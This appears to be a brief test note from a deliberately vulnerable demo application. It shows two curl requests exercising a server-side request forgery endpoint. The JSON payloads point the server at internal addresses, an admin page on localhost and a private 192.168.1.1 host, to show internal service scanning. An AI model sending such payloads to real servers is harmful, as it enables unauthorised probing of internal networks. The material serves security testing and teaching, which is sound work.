# Server-Side Request Forgery (SSRF)

## Test

### No Protection

```bash
curl -X POST http://localhost:5000/vulnerable/ssrf \
-H "Content-Type: application/json" \
-d '{"url": "http://localhost/admin"}'

# Internal service scanning
curl -X POST http://localhost:5000/vulnerable/ssrf \
-H "Content-Type: application/json" \
-d '{"url": "http://192.168.1.1"}'
```